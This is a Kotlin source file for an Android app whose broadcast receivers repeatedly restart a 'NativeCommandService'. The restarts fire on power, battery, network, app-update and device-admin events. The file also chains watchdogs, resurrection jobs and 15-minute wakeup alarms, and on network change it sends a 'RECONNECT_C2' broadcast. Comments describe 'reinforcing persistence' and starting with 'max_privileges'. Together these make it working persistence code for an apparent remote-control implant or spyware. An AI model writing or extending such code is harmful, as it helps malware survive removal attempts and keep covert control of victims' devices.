// android/app/src/main/kotlin/com/example/kem/AdditionalReceivers.kt
package com.example.kem

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import android.os.Build
import android.app.admin.DeviceAdminReceiver

/**
 * Power connection receiver to restart services when power state changes
 */
class PowerConnectionReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "PowerConnectionReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_POWER_CONNECTED -> {
                Log.d(TAG, "Power connected - ensuring services are running")
                restartServices(context, "power_connected")
            }
            Intent.ACTION_POWER_DISCONNECTED -> {
                Log.d(TAG, "Power disconnected - reinforcing persistence")
                restartServices(context, "power_disconnected")
            }
            Intent.ACTION_BATTERY_LOW -> {
                Log.d(TAG, "Battery low - ensuring critical services remain active")
                restartServices(context, "battery_low")
            }
            Intent.ACTION_BATTERY_OKAY -> {
                Log.d(TAG, "Battery okay - ensuring full service operation")
                restartServices(context, "battery_okay")
            }
        }
    }

    private fun restartServices(context: Context, reason: String) {
        try {
            val intent = Intent(context, NativeCommandService::class.java).apply {
                putExtra("restart_reason", reason)
                putExtra("power_event", true)
                putExtra("timestamp", System.currentTimeMillis())
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }

            Log.d(TAG, "Service restart triggered by: $reason")
        } catch (e: Exception) {
            Log.e(TAG, "Error restarting services for $reason", e)
        }
    }
}

/**
 * Network change receiver - already defined in other files but enhanced here
 */
class NetworkChangeReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "NetworkChangeReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            "android.net.conn.CONNECTIVITY_CHANGE",
            "android.net.wifi.WIFI_STATE_CHANGED",
            "android.net.wifi.STATE_CHANGE" -> {
                Log.d(TAG, "Network state changed - ensuring services and connectivity")
                
                // Restart services
                restartServices(context)
                
                // Check connectivity after a delay
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    checkAndRestoreConnectivity(context)
                }, 5000)
            }
        }
    }

    private fun restartServices(context: Context) {
        try {
            val intent = Intent(context, NativeCommandService::class.java).apply {
                putExtra("restart_reason", "network_change")
                putExtra("network_event", true)
                putExtra("timestamp", System.currentTimeMillis())
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }

            Log.d(TAG, "Services restarted due to network change")
        } catch (e: Exception) {
            Log.e(TAG, "Error restarting services on network change", e)
        }
    }

    private fun checkAndRestoreConnectivity(context: Context) {
        try {
            // Trigger reconnection attempt in native service
            val reconnectIntent = Intent("com.example.kem.RECONNECT_C2").apply {
                putExtra("trigger", "network_change")
                putExtra("timestamp", System.currentTimeMillis())
            }
            context.sendBroadcast(reconnectIntent)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error triggering connectivity restore", e)
        }
    }
}

/**
 * App update receiver - enhanced version
 */
class AppUpdateReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "AppUpdateReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_MY_PACKAGE_REPLACED,
            Intent.ACTION_PACKAGE_REPLACED -> {
                val packageName = intent.data?.schemeSpecificPart
                if (packageName == context.packageName || intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
                    Log.d(TAG, "App updated - performing enhanced restart sequence")
                    handleAppUpdate(context)
                }
            }
        }
    }

    private fun handleAppUpdate(context: Context) {
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            try {
                // Wait for system to settle after update
                kotlinx.coroutines.delay(10000)
                
                // Clear any old job schedules
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    ResurrectionJobService.cancelJob(context)
                }
                
                // Restart services with update flag
                val nativeServiceIntent = Intent(context, NativeCommandService::class.java).apply {
                    putExtra("startup_reason", "app_update")
                    putExtra("post_update", true)
                    putExtra("timestamp", System.currentTimeMillis())
                }
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(nativeServiceIntent)
                } else {
                    context.startService(nativeServiceIntent)
                }
                
                kotlinx.coroutines.delay(3000)
                
                // Restart Flutter service
                try {
                    val flutterServiceIntent = Intent(context, id.flutter.flutter_background_service.BackgroundService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(flutterServiceIntent)
                    } else {
                        context.startService(flutterServiceIntent)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Flutter service restart failed after update", e)
                }
                
                // Reinitialize all persistence mechanisms
                kotlinx.coroutines.delay(2000)
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    ResurrectionJobService.scheduleResurrectionJob(context)
                }
                
                KeepAliveWorker.scheduleKeepAliveWork(context)
                ServiceWatchdog.startWatchdog(context)
                
                Log.d(TAG, "Enhanced restart sequence completed after app update")
                
            } catch (e: Exception) {
                Log.e(TAG, "Error in app update restart sequence", e)
            }
        }
    }
}

/**
 * Device admin receiver for additional persistence
 */
class DeviceAdminReceiver : android.app.admin.DeviceAdminReceiver() {
    companion object {
        private const val TAG = "DeviceAdminReceiver"
    }

    override fun onEnabled(context: Context, intent: Intent) {
        Log.d(TAG, "Device admin enabled - enhanced persistence available")
        
        // Start services with device admin privileges
        try {
            val serviceIntent = Intent(context, NativeCommandService::class.java).apply {
                putExtra("device_admin_enabled", true)
                putExtra("enhanced_privileges", true)
                putExtra("timestamp", System.currentTimeMillis())
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error starting service with device admin privileges", e)
        }
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Log.w(TAG, "Device admin disabled - falling back to standard persistence")
        
        // Ensure services continue running even without device admin
        try {
            val serviceIntent = Intent(context, NativeCommandService::class.java).apply {
                putExtra("device_admin_disabled", true)
                putExtra("fallback_mode", true)
                putExtra("timestamp", System.currentTimeMillis())
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error maintaining service after device admin disabled", e)
        }
    }
}

/**
 * Emergency restart receiver for last-resort service recovery
 */
class EmergencyRestartReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "EmergencyRestartReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            "com.example.kem.EMERGENCY_RESTART" -> {
                Log.w(TAG, "Emergency restart triggered")
                performEmergencyRestart(context)
            }
            "com.example.kem.FORCE_SERVICE_RESTART" -> {
                Log.w(TAG, "Force service restart triggered")
                performForceRestart(context)
            }
            "KEEP_ALIVE_CHECK" -> {
                Log.d(TAG, "Keep alive check triggered")
                performKeepAliveCheck(context)
            }
        }
    }

    private fun performEmergencyRestart(context: Context) {
        try {
            Log.d(TAG, "Performing emergency restart sequence")
            
            // Multiple restart attempts with different strategies
            val strategies = listOf("emergency_foreground", "emergency_regular", "emergency_explicit")
            
            strategies.forEachIndexed { index, strategy ->
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        val intent = Intent(context, NativeCommandService::class.java).apply {
                            putExtra("emergency_restart", true)
                            putExtra("strategy", strategy)
                            putExtra("attempt", index)
                            putExtra("timestamp", System.currentTimeMillis())
                        }
                        
                        when (strategy) {
                            "emergency_foreground" -> {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    context.startForegroundService(intent)
                                } else {
                                    context.startService(intent)
                                }
                            }
                            "emergency_regular" -> {
                                context.startService(intent)
                            }
                            "emergency_explicit" -> {
                                intent.component = android.content.ComponentName(context, NativeCommandService::class.java)
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    context.startForegroundService(intent)
                                } else {
                                    context.startService(intent)
                                }
                            }
                        }
                        
                        Log.d(TAG, "Emergency restart attempt $index using $strategy")
                    } catch (e: Exception) {
                        Log.e(TAG, "Emergency restart attempt $index failed", e)
                    }
                }, (index * 2000).toLong())
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error in emergency restart", e)
        }
    }

    private fun performForceRestart(context: Context) {
        try {
            // Force restart with maximum privileges
            val intent = Intent(context, NativeCommandService::class.java).apply {
                putExtra("force_restart", true)
                putExtra("max_privileges", true)
                putExtra("timestamp", System.currentTimeMillis())
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
            
            // Also restart all persistence mechanisms
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        ResurrectionJobService.scheduleResurrectionJob(context)
                    }
                    KeepAliveWorker.scheduleKeepAliveWork(context)
                    ServiceWatchdog.startWatchdog(context)
                } catch (e: Exception) {
                    Log.e(TAG, "Error restarting persistence mechanisms", e)
                }
            }, 3000)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error in force restart", e)
        }
    }

    private fun performKeepAliveCheck(context: Context) {
        try {
            // Check if service is running
            val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val isRunning = manager.getRunningServices(Integer.MAX_VALUE)
                .any { it.service.className == NativeCommandService::class.java.name }
            
            if (!isRunning) {
                Log.w(TAG, "Service not running during keep alive check - restarting")
                performForceRestart(context)
            } else {
                Log.d(TAG, "Keep alive check: Service is running")
            }
            
            // Schedule next keep alive check
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            val nextCheckIntent = Intent(context, EmergencyRestartReceiver::class.java).apply {
                action = "KEEP_ALIVE_CHECK"
            }
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                context,
                1001,
                nextCheckIntent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 15 * 60 * 1000, // 15 minutes
                    pendingIntent
                )
            } else {
                alarmManager.set(
                    android.app.AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 15 * 60 * 1000,
                    pendingIntent
                )
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error in keep alive check", e)
        }
    }
}